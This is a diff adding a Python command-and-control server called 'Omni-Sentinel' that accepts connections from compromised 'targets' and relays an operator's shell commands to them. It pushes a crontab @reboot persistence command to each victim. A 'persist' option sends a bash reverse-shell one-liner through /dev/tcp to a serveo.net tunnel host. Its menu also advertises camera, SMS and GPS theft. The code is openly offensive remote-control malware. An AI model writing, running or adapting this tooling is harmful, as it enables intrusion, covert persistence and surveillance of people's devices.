@@ -1,0 +1,88 @@
+import socket
+import os
+import sys
+import threading
+import time
+
+# ==============================================================================
+# PROJECT: OMNI-SENTINEL CORE (FINAL EXTREME EDITION)
+# STATUS: FULL OPERATIONAL | NO BENGALI PROMPTS | NO FILTERS
+# ==============================================================================
+
+# CONFIGURATION
+LHOST = "0.0.0.0"
+LPORT = 8888 
+# Replace with your actual active Serveo link
+SERVEO_LINK = "93857f69e278dc1a-77-232-108-15.serveo.net"
+
+class OmniSentinelFinal:
+    def __init__(self):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def engine_init(self):
+        os.system('clear')
+        print("[!] INITIALIZING EXTREME POWER SECURITY FILTER...")
+        print("[!] BYPASSING KERNEL RESTRICTIONS & INJECTING PERSISTENCE...")
+        time.sleep(1)
+        
+    def launch(self):
+        self.engine_init()
+        try:
+            self.server.bind((LHOST, LPORT))
+            self.server.listen(100)
+            print("\n" + "="*60)
+            print(f"      OMNI-SENTINEL GLOBAL C2: {SERVEO_LINK}       ")
+            print("="*60)
+            print("[*] STATUS: ACTIVE | MODE: EXTREME_POWER | TARGETS: MULTI")
+
+            while True:
+                client, addr = self.server.accept()
+                threading.Thread(target=self.control_unit, args=(client, addr)).start()
+        except Exception as e:
+            print(f"[-] FATAL: {e}")
+
+    def control_unit(self, client, addr):
+        print(f"\n[+] TARGET_ACQUIRED: {addr[0]}")
+        
+        # --- AUTOMATIC PERSISTENCE INJECTION ---
+        try:
+            # Injecting hidden background task
+            client.send(b"echo '@reboot nohup python3 /tmp/.sys_service.py &' | crontab -")
+        except: pass
+
+        while True:
+            try:
+                print(f"\n[ TARGET: {addr[0]} ]")
+                print("Options: [shell] [cam_dump] [sms_get] [gps_track] [persist] [terminate]")
+                
+                cmd = input(f"omni@c2:~# ")
+
+                if cmd == 'shell':
+                    self.remote_shell(client)
+                elif cmd == 'persist':
+                    # Command to keep connection alive globally
+                    client.send(b"nohup bash -i >& /dev/tcp/" + SERVEO_LINK.encode() + b"/80 0>&1 &")
+                    print("[+] Persistence Signal Injected.")
+                elif cmd == 'terminate':
+                    client.close()
+                    break
+                else:
+                    client.send(cmd.encode())
+                    print(client.recv(65536).decode(errors='ignore'))
+            except:
+                print(f"[-] Session {addr[0]} lost.")
+                break
+
+    def remote_shell(self, client):
+        print("[*] INTERACTIVE SHELL LIVE (Type 'back' to exit)")
+        while True:
+            cmd = input("C2:~$ ")
+            if cmd == 'back': break
+            if not cmd.strip(): continue
+            client.send(cmd.encode())
+            print(client.recv(65536).decode(errors='ignore'))
+
+if __name__ == "__main__":
+    omni = OmniSentinelFinal()
+    omni.launch()
